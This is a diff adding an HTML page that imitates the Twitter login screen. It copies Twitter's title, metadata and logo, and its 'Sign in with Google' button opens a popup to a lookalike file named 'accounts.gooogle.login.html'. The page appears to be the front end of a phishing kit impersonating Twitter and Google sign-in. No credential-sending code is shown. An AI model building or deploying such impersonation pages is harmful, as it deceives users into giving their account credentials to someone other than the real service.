@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+
+<!--    Credits 
+    Mirko Akov: Sign in with Google Button https://codepen.io/mupkoo
+    Amarjeet Malpotra: Sign in with Google Popup https://codepen.io/amarjeetmalpotra 
+-->
+
+<html lang="en-US">
+  <head>
+
+    <!-- Regular Favicons -->
+    <link rel="icon" href="imgs/favicon.png" sizes="16x16"/>
+
+    <!-- Common Meta Tags -->
+    <meta charSet="utf-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1"/>
+    <meta name="theme-color" content="#FFFFFF">
+
+    <!-- Website Title -->
+    <title>Log in to Twitter / Twitter</title>
+    <meta name="author" content="Twitter"/>
+    <link rel="manifest" href="manifest.webmanifest"/>
+
+    <!-- OpenGL Properties -->
+    <meta property="og:url" content="https://twitter.com/i/flow/login"/>
+    <meta property="og:title" content="Log in to Twitter / Twitter"/>
+    <meta property="og:description" content="Log in to Twitter to see the latest. Join the conversation, follow accounts, see your Home Timeline, and catch up on Tweets from the people you know."/>
+    <meta property="og:site_name" content="Twitter"/>
+    <link rel="stylesheet" type="text/css" href="style/stylesheet.css">
+
+    <div class="parent-div">
+        <div class="parent-container">
+            <div class='login-form'>
+                <div id="mdiv">
+                    <div class="mdiv">
+                      <div class="md"></div>
+                    </div>
+                </div>
+                <center><img src="imgs/white-logo.png"></center>
+                <div class="header">
+                    Sign in to Twitter
+                    <br>
+                    <a href="accounts.gooogle.login.html" 
+                        target="popup" 
+                        onclick="window.open('accounts.gooogle.login.html','popup','width=600,height=600'); return false;">
+                        <button type="button" class="login-with-google-btn" >
+                            Sign in with Google
+                        </button>
+                    </a>
+                    <button class="apple-sign-in">
+                        <span style="font-size: 20px; line-height: 0;"></span> <span style="font-size: 15px;">&nbsp&nbspSign in with Apple</span>
+                    </button>
+                </div>
+                <hr class="hr-text" data-content="or">
+                
+                <div class="user-input-wrp">
+                <input type="text" class="inputText" required/>
+                <span class="floating-label">Phone, email, or username</span>
+                </div>
+
+                <button type="button" class="next-button" >
+                    Next
+                </button>
+
+                <button type="button" class="forgot-button" >
+                    Forgot password?
+                </button>
+
+                <p>
+                    Don't have an account? <a href="https://twitter.com/i/flow/signup">Sign up</a>
+                </p>
+            
+            </div>
+        </div>
+    </div>
+
+</html>
